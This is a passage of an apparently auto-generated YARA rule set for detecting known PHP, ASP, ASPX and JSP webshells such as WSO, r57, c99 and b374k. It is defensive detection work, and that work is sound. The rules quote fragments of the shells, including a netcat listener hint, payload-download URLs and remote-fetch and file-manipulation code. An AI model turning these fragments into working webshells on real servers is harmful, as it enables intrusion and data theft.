      $s14 = "ect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style=\"border-bottom:0;margin:0;\" readonly>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso2_wso_404_288 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso2.php, wso_404.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash4 = "fd3db2020e82517d8fbfcc8dd3399efbdf82057353b94509995bba128030d193"
   strings:
      $s1 = "    echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',n" ascii
      $s2 = "den name=c value='\". htmlspecialchars($GLOBALS['cwd']) .\"'><input type=hidden name=charset value='\". (isset($_POST['charset']" ascii
      $s3 = "pan><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'" fullword ascii
      $s4 = "\\',\\'\\',\\'\\',\\'\\')\">[ home ]</a><br>' . $drives . '</td>'" fullword ascii
      $s5 = "'%)<br>' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick=\"g(\\'FilesMan\\',\\'' . $GLOBALS['home_cwd']" ascii
      $s6 = "br>' . wsoViewSize($totalSpace) . ' <span>Free:</span> ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . " ascii
      $s7 = ">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER[\"SERVER_ADDR\"] . '<br><span>Client IP:<" ascii
      $s8 = "       . '<td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page chars" ascii
      $s9 = "<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #" ascii
      $s10 = ",this.code.value);}else{g(\\'Php\\',null,this.code.value,\\'\\');}return false;\"><textarea name=code class=bigarea id=PhpCode>'" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso2_wso_ng_wso_289 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso2.php, wso-ng.php, wso.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash4 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
      hash5 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
   strings:
      $s1 = "div.content{ padding: 5px;margin-left:5px;background-color:#333; }" fullword ascii
      $s2 = "table.info{ color:#fff;background-color:#222; }" fullword ascii
      $s3 = "a:hover{ text-decoration:underline; }" fullword ascii /* Goodware String - occured 1 times */
      $s4 = ".l2{background-color:#333}" fullword ascii
      $s5 = "body{background-color:#444;color:#e1e1e1;}" fullword ascii
      $s6 = ".bigarea{ width:100%;height:300px; }" fullword ascii
      $s7 = "span{ font-weight: bolder; }" fullword ascii
      $s8 = "pre{font-family:Courier,Monospace;}" fullword ascii
      $s9 = ".ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }" fullword ascii
      $s10 = ".toolsInp{ width: 300px }" fullword ascii
      $s11 = ".l1{background-color:#444}" fullword ascii
      $s12 = "a{ text-decoration:none; }" fullword ascii
      $s13 = ".main th{text-align:left;background-color:#5e5e5e;}" fullword ascii
      $s14 = "body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _radhat___290 {
   meta:
      description = "webshell - from files radhat.asp, .asp, .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2cc89b0e2ac08b26c312e2915d66a9e9f17ecbf63467e4258adbbeee5d5e84dc"
      hash2 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
      hash3 = "a2c27bba48ac3d292a060b3d1e428e504281826e333729e95d0b04f2056fa1c5"
   strings:
      $s1 = "server.scripttimeout=600" fullword ascii
      $s2 = "const dbx=\"http://aspmuma.net/web/php.txt,http://aspmuma.net/web/aspx.txt,http://aspmuma.net/web/pl.txt\"" fullword ascii
      $s3 = "Response.Expires=-1" fullword ascii
      $s4 = "response.buffer=true" fullword ascii
      $s5 = "public  br,ygv,gbc,ydo,yka,wzd,sod,vmd" fullword ascii
      $s6 = "Const mam=\"want_pre.asp\"" fullword ascii
      $s7 = "Const pxo=\"RedHat\"" fullword ascii
      $s8 = "Const nkw=\"RedHat\"" fullword ascii
      $s9 = "vmd=\"gzjm51r2NOlL7YWESsdqvhBxaJ4Mu9IAXH8ZGPF6k0U3QfRcDibCyeKonVTtwp" fullword ascii
      $s10 = "Const ywc=False" fullword ascii
      $s11 = "sod=Array(\"D\",\"7\",\"S\",\"O\",\"q\",\"G\",\"j\",\"l\",\"z\",\"4\",\"L\",\"k\",\"m\",\"x\",\"0\",\"c\",\"v\",\"H\",\"f\",\"3" ascii
      $s12 = "Const xim=True" fullword ascii
      $s13 = "sod=Array(\"D\",\"7\",\"S\",\"O\",\"q\",\"G\",\"j\",\"l\",\"z\",\"4\",\"L\",\"k\",\"m\",\"x\",\"0\",\"c\",\"v\",\"H\",\"f\",\"3" ascii
      $s14 = "\",\"Y\",\"2\",\"i\",\"M\",\"P\",\"o\",\"R\",\"u\",\"J\",\"Z\",\"5\",\"X\",\"B\",\"V\",\"F\",\"p\",\"N\",\"e\",\"1\",\"T\",\"w\"" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_NEW_WebShell__1__2014_4_0__1__UnKnown_Vip__1__UnKnown_Vi_291 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, NEW WebShell (1).asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, NEW WebShell.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash6 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash7 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash8 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash9 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash10 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash11 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash12 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash13 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash14 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash15 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "  Public Function UA(F)" fullword ascii
      $s2 = "  Public Function Form(F)" fullword ascii
      $s3 = "  Public function SaveAs(F)" fullword ascii
      $s4 = "T1.Type = 1 : T1.Mode =3 : T1.Open" fullword ascii
      $s5 = "  FileStart= 0" fullword ascii
      $s6 = "  if trim(F)=\"\" or FileStart=0 then exit function" fullword ascii
      $s7 = "  FileSize = 0" fullword ascii
      $s8 = "  set T3=CreateObject(ObT(6,0))" fullword ascii
      $s9 = "  SaveAs=true" fullword ascii
      $s10 = "  dim T3" fullword ascii
      $s11 = "  Dim CF" fullword ascii
      $s12 = "  Dim D1,D2" fullword ascii
      $s13 = "  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName" fullword ascii
      $s14 = "vbCrlf = chrB(13) & chrB(10)" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_decoded_tool_aspydrv_292 {
   meta:
      description = "webshell - from files shell_decoded.asp, tool.asp, aspydrv.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
      hash2 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
      hash3 = "d4e2230991106a793376037e910e657d810a4679ab08fbad3eb9b6089a6365c0"
   strings:
      $s1 = "Uploader.Upload()" fullword ascii
      $s2 = "Set Uploader = New FileUploader" fullword ascii
      $s3 = "If Uploader.Files.Count = 0 Then" fullword ascii
      $s4 = "For Each File In Uploader.Files.Items" fullword ascii
      $s5 = "oField.AppendChunk FileData" fullword ascii
      $s6 = "Public Sub SaveToDatabase(ByRef oField)" fullword ascii
      $s7 = "Dim oUploadFile, sFileName" fullword ascii
      $s8 = "If IsObject(oField) Then" fullword ascii
      $s9 = "Dim nPosFile, nPosBound" fullword ascii
      $s10 = "Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos" fullword ascii
      $s11 = "Dim biData, sInputName" fullword ascii
      $s12 = "If LenB(FileData) = 0 Then Exit Sub" fullword ascii
      $s13 = "Dim nIndex" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x2023 ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_SnIpEr_SA_Shell_r57_Mohajer22_293 {
   meta:
      description = "webshell - from files r57shell127.php, SnIpEr_SA Shell.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "// $auth = 1; - " fullword ascii
      $s2 = "// $auth = 0; - " fullword ascii
      $s3 = " (Login & Password for access)" fullword ascii
      $s4 = "  (user login)" fullword ascii
      $s5 = " (user password)" fullword ascii
      $s6 = "!!! (CHANGE THIS!!!)" fullword ascii
      $s7 = " /bin/bash'," fullword ascii
      $s8 = "/* ~~~ " fullword ascii
      $s9 = " | Options  ~~~ */" fullword ascii
      $s10 = " phpinfo()'," fullword ascii
      $s11 = " | Language" fullword ascii
      $s12 = " ( authentification = Off )" fullword ascii
      $s13 = "  ( authentification = On  )" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_r57_Mohajer22_r57_kartal_r57_294 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "BORDER-RIGHT:  #eeeeee 1px outset;" fullword ascii
      $s2 = " echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verda" ascii
      $s3 = "      if(rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>" ascii
      $s4 = "       if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#ccccc" ascii
      $s5 = "<tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(1).'&nbsp;" fullword ascii
      $s6 = "$table_up3  = \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_r57_Mohajer22_295 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "ase</b></font></div>\";" fullword ascii
      $s2 = "'eng_text36'=>'Database . Table'," fullword ascii
      $s3 = "'eng_text39'=>'Database'," fullword ascii
      $s4 = "       echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$sql->error.\"</b></font></td></tr></table>\";" fullword ascii
      $s5 = " if(!$sql->connect()) echo \"<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to SQL server</b></font></d" ascii
      $s6 = " if(!$sql->connect()) echo \"<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to SQL server</b></font></d" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _1n73ction_b374k_2_2_b374k_2_3_296 {
   meta:
      description = "webshell - from files 1n73ction.php, b374k-2.2.php, b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash2 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash3 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "else return \"??????????\";" fullword ascii
      $s2 = "foreach($dname as $folder){" fullword ascii
      $s3 = "<input type=\\\"hidden\\\" name=\\\"oldname\\\" value=\\\"\".$file.\"\\\" style=\\\"margin:0;padding:0;\\\" />" fullword ascii
      $s4 = "$time = date(\"d-M-Y H:i\",time());" fullword ascii
      $s5 = "<input type=\\\"hidden\\\" name=\\\"oldname\\\" value=\\\"\".$folder.\"\\\" style=\\\"margin:0;padding:0;\\\" />" fullword ascii
      $s6 = "if($folder == \".\") {" fullword ascii
      $s7 = "<input type=\\\"hidden\\\" name=\\\"oldname\\\" value=\\\"\".$filn.\"\\\" style=\\\"margin:0;padding:0;\\\" />" fullword ascii
      $s8 = "foreach($fname as $file){" fullword ascii
      $s9 = "<input class=\\\"inputzbut\\\" type=\\\"submit\\\" name=\\\"rename\\\" style=\\\"width:35px;\\\" value=\\\"Go !\\\" />" fullword ascii
      $s10 = "<input class=\\\"inputzbut\\\" type=\\\"submit\\\" name=\\\"rename\\\" value=\\\"rename\\\" />" fullword ascii
      $s11 = "$owner = $name['name'].\"<span class=\\\"gaya\\\"> : </span>\".$group['name'];" fullword ascii
      $s12 = "<input class=\\\"inputz\\\" style=\\\"width:200px;\\\" type=\\\"text\\\" name=\\\"newname\\\" value=\\\"\".$filn.\"\\\" />" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99shell_c99_w4cking_c99_297 {
   meta:
      description = "webshell - from files c66.php, c99shell.php, c99_w4cking.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash4 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo \"Warning! Configuration error in \\$regxp_highlight" ascii
      $s2 = ".$k.\"][0] - unknown command.\"; c99shexit();}" fullword ascii
      $s3 = "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666" ascii
      $s4 = "if ($selfwrite or $updatenow) {@ob_clean(); c99sh_getupdate($selfwrite,1); exit;}" fullword ascii
      $s5 = "  echo \"<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"100%\\\" bgColor=#333333 borderColorLight" ascii
      $s6 = "echo \"<TABLE style=\\\"BORDER-COLLAPSE: collapse\\\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\\"100%\\\" bgC" ascii
      $s7 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE style=\\\"BORDER-COLLAPSE: collapse\\\" cellSpacin" ascii
      $s8 = "function c99shexit()" fullword ascii
      $s9 = "333 borderColorLight=#c0c0c0 border=1><tr><td width=\\\"100%\\\" valign=\\\"top\\\">\";" fullword ascii
      $s10 = "lPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>" fullword ascii
      $s11 = "if ($act == \"phpinfo\") {@ob_clean(); phpinfo(); c99shexit();}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _devilzShell_devshell_devilzShell_298 {
   meta:
      description = "webshell - from files devilzShell.aspx, devshell.jsp, devilzShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "73c99b46c973b605d3a9d7b288ffc70c6a62cbf620ccd99b0c44876c77f8bd6e"
      hash2 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
      hash3 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s2 = "AABAAAAAAAAAAEAAAAAAAAAAC" ascii /* base64 encoded string '  @       @       ' */
      $s3 = "AAAAAAAAAAB" ascii /* base64 encoded string '        ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '              ' */
      $s5 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
      $s6 = "AAAAACAAAA" ascii /* base64 encoded string '       ' */
      $s7 = "AAAAABAAAA" ascii
      $s8 = "AAAAAAEAAAA" ascii
      $s9 = "AAAAAAAAAA0" ascii
      $s10 = "D8AAAAAAAAAA" ascii
      $s11 = "AAAAAAAAAc" ascii
      $s12 = "AAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAACAAAA" ascii
      $s13 = "AAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _fileupload_filesystembrowser_299 {
   meta:
      description = "webshell - from files fileupload.aspx, filesystembrowser.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3a6091fd5b5755d0249ef4d6af11c807dbe902c2428f923ad2490e99ebbf06ad"
      hash2 = "378b4a644f60d3e469486ec4ee1911330b36323185b82e1a3b96a1ec8e795638"
   strings:
      $s1 = "    private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbod" ascii
      $s2 = ",pre,form input,form select {\\n font-family: \\\"Lucida Console\\\", monospace;\\n font-size: 88%;\\n}\\n-->\\n</style></head>" ascii
      $s3 = "    private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbod" ascii
      $s4 = "            if (Request.Params[\"authkey\"] != AUTHKEY)" fullword ascii
      $s5 = "                    Response.Write(\"Unknown operation\");" fullword ascii
      $s6 = "                    Response.Write(HEADER);" fullword ascii
      $s7 = "            if (Request.Params[\"operation\"] != null)" fullword ascii
      $s8 = "            Response.Write(HEADER);" fullword ascii
      $s9 = "                Response.Write(HEADER);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( all of them )
      ) or ( all of them )
}

rule _c5_403_queryDong_000_spyjsp2010_300 {
   meta:
      description = "webshell - from files c5.jsp, 403.jsp, queryDong.jsp, 000.jsp, spyjsp2010.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash3 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash4 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash5 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
   strings:
      $s1 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword ascii
      $s2 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
      $s3 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
      $s4 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
      $s5 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
      $s6 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
      $s7 = "while (e.hasMoreElements())" fullword ascii
      $s8 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
      $s9 = "BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(saveF));" fullword ascii
      $s10 = "ZipEntry entry = (ZipEntry)e.nextElement();" fullword ascii
      $s11 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
      $s12 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option value='GBK'>GBK</option><option value='UTF-8'>UTF-8" ascii
      $s13 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option value='GBK'>GBK</option><option value='UTF-8'>UTF-8" ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1__UnKnown_Vip__1__UnKnown_Vip__2012___301 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, _2012.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash6 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash7 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash8 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash9 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "fileName = \"index.htm.txt\"" fullword ascii
      $s2 = "If Http.ReadyState <> 4 Then " fullword ascii
      $s3 = "Set Http = Server.CreateObject(\"MSXML2.XMLHTTP\")" fullword ascii
      $s4 = "Set Http = Nothing" fullword ascii
      $s5 = "Set stream = Server.CreateObject(\"ad\"&e&\"odb.st\"&e&\"ream\")" fullword ascii
      $s6 = "thePath = thePath & \"\\\" & fileName" fullword ascii
      $s7 = "If isDebugMode = False Then" fullword ascii
      $s8 = "theUrl = Request(\"theUrl\")" fullword ascii
      $s9 = "If fileName = \"\" Then" fullword ascii
      $s10 = "fileName = Split(theUrl, \"/\")(UBound(Split(theUrl, \"/\")))" fullword ascii
      $s11 = "If Err.Number = 3004 Then" fullword ascii
      $s12 = "overWrite = Request(\"overWrite\")" fullword ascii
      $s13 = " '><br/>\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _2014_2013____1__r00tsFSO_302 {
   meta:
      description = "webshell - from files 2014.asp, 2013.asp, .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash2 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash3 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash4 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash5 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "All_Users" fullword ascii
      $s2 = "Alluser" fullword ascii
      $s3 = "Documents" fullword ascii /* Goodware String - occured 25 times */
      $s4 = "Program" fullword ascii /* Goodware String - occured 194 times */
      $s5 = "ServU(1)" fullword ascii
      $s6 = "ProgramE" fullword ascii
      $s7 = "ProgramD" fullword ascii
      $s8 = "ServU(2)" fullword ascii
      $s9 = "\\\\\"\")'>(6)" fullword ascii
      $s10 = "\\\\\"\")'>(7)" fullword ascii
      $s11 = "\"\")'>(10)" fullword ascii
      $s12 = "pcAnywhere" fullword ascii
   condition:
      ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57_Mohajer22_r57_303 {
   meta:
      description = "webshell - from files r57shell127.php, r57_Mohajer22.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash3 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = " else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fo" ascii
      $s2 = "echo '</table>'.$table_up3.\"</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by R" ascii
      $s3 = " if(!$users=get_users()) { echo \"<center><font face=Verdana size=-2 color=red>\".$lang[$language.'_text96'].\"</font></center>" ascii
